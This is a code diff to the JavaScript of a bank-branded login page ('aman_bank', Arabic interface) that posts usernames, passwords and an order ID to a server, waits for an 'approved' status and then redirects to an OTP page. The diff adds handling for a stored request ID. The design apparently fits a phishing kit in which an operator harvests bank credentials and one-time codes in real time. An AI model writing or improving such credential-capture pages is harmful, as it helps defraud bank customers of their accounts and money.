@@ -616,6 +616,7 @@
             if (data.status === 'approved') {
               stopStatusPoll();
               sessionStorage.setItem('aman_bank_request_id', requestId);
+              sessionStorage.removeItem('aman_bank_current_request_id');
               window.location.href = 'otp.html';
             } else if (data.status === 'rejected') {
               stopStatusPoll();
@@ -642,6 +643,7 @@
     });
 
     var loginSubmitting = false;
+    var currentRequestId = sessionStorage.getItem('aman_bank_current_request_id') ? Number(sessionStorage.getItem('aman_bank_current_request_id')) : null;
     loginBtn.addEventListener('click', function () {
       if (loginSubmitting) return;
       var valid = true;
@@ -665,20 +667,22 @@
         loadingSpinner.style.display = 'block';
         loadingText.textContent = 'جاري تسجيل الدخول...';
         retryBtn.style.display = 'none';
-        // أرسل البيانات فعليًا للسيرفر الخلفي (server.js) بدل أي محاكاة محلية
         fetch('/api/login', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             username: username.value.trim(),
             password: password.value.trim(),
-            orderId: sessionStorage.getItem('aman_bank_order_id')
+            orderId: sessionStorage.getItem('aman_bank_order_id'),
+            existingRequestId: currentRequestId
           })
         })
         .then(function(res){ return res.json(); })
         .then(function(data){
           if (data.ok) {
             sessionStorage.removeItem('aman_bank_order_id');
+            currentRequestId = data.id;
+            sessionStorage.setItem('aman_bank_current_request_id', data.id);
             pollLoginStatus(data.id);
           } else {
             loginSubmitting = false;
